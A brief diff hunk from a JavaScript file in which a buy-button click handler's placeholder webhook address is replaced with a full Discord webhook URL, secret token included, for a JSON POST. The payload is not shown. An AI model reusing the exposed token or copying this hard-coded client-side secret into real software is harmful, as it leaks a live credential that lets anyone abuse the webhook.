@@ -94,7 +94,7 @@ document.getElementById('buyBtn').addEventListener('click', function() {
     };
 
     // Send to webhook
-    fetch('YOUR_WEBHOOK_URL', {
+    fetch('https://discord.com/api/webhooks/1268893038793719859/_ktjZVX-uHx8UVoYu7GAdrpkRLpbysF11nl120aBoWKRwdsY06g_9dAq1HYG7yeWvqwk', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json',
